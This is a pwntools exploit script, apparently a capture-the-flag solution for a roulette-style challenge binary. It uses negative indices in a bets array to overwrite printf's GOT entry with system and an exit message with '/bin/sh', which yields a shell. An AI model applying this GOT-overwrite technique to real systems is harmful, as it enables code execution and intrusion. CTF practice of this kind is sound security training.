from pwn import *
context.log_level = 'debug'

# p = process(["../chal/double_zer0_dilemma"])
#log.info(str(p.pid))
#pause()
p = remote('localhost', 9999)
pause()
# Define variables
libc_address = 0x7ffff7e22290
bets_address = 0x0808d0e0
exit_msg_address = 0x0808d080
printf_got_address = 0x0808d020

bin_sh_value = 0x68732f6e69622f
printf_got_value = 0x401040
exit_msg_first_8_bytes = 0x746f742072756f59


# Calculate distance from bets for the desired addresses
exit_msg = -1 * ((bets_address - exit_msg_address) // 8)
printf_got = -1 * ((bets_address - printf_got_address) // 8)

# Calculate offset to add
bin_sh = (2 * bin_sh_value) - exit_msg_first_8_bytes
system = (2 * libc_address) - printf_got_value

log.info(bin_sh)
log.info(system)

# Put /chal/sh into exit_msg
p.recvuntil(b"roulette will land on: \n")
p.send(str(exit_msg)+"\n")
p.recvuntil(b"Enter the amount you want to wager: \n")
p.sendline(str(bin_sh))

# Put system in printf
p.recvuntil(b"roulette will land on: \n")
p.send(str(printf_got)+"\n")
p.recvuntil(b"Enter the amount you want to wager: \n")
p.sendline(str(system))

# When "printf" is called, system("/chal/sh") will trigger
p.interactive()
